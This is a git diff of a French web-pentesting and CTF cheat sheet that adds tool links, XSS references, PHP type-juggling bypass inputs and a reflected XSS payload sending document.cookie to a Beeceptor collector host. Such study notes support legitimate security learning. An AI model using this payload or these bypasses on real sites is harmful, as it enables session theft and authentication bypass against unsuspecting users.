@@ -3,10 +3,15 @@
 - [Burp](https://portswigger.net/burp)
 - [Jwt_tool](https://github.com/ticarpi/jwt_tool)
 - [Beeceptor](https://beeceptor.com/)
+- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
 
-- https://archive.md/ (web archive par mots clés & copie de sites)
+- [Wayback machine ](https://archive.org), https://archive.md/ (web archive par mots clés & copie de sites)
 
 - `curl -v site`: check les headers par exemple
+
+## Extensions
+
+- [Hacktools](https://addons.mozilla.org/fr/firefox/addon/hacktools/)
 
 ## Doc
 
@@ -16,11 +21,38 @@
 
 - [Hacktricks](https://book.hacktricks.xyz/welcome/readme)
 
-- [PayloadBox](https://github.com/payloadbox)
+- [Cheatsheet XSS (Ruulian)](https://0xhorizon.eu/fr/cheat-sheet/xss/)
+
+Aussi:
+
+https://brightsec.com/blog/xss/#xss-types
+https://blog.clever-age.com/fr/2014/02/10/owasp-xss-cross-site-scripting/
+https://excess-xss.com/
 
 ## Bypass filters
 
 [SQLi: énumération via UNION](https://github.com/0x14mth3n1ght/Writeup/blob/master/2022/Star2022/Web/SQL/sql.txt)
 [PHP filters](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
 [PHP: extract() & loose comparison](https://github.com/0x14mth3n1ght/Writeup/tree/master/2023/FCSC/web/salty)
-[XSS](https://0xhorizon.eu/fr/cheat-sheet/xss/)
+[PHP Type juggling](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdfhttps://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)
+
+- GET: `?password[]=''`
+- POST: `password:[]`
+
+[PayloadBox](https://github.com/payloadbox)
+
+[Stored & Reflected XSS (hackndo)](https://beta.hackndo.com/attaque-xss/)
+
+`Reflected XSS`
+
+Report link:
+
+```html
+https://vulnerable.org?parameter=<img src="//night.free.beeceptor.com?data=".concat(document.cookie)>
+```
+
+[Dom Based XSS](https://blog.cyxo.re/pwnme-2022/pimp-my-bicycle/)
+
+-> appel ou accès aux éléments du DOM (ex document.getElementByID)
+
+[CSP Bypass](https://csplite.com/csp320/)
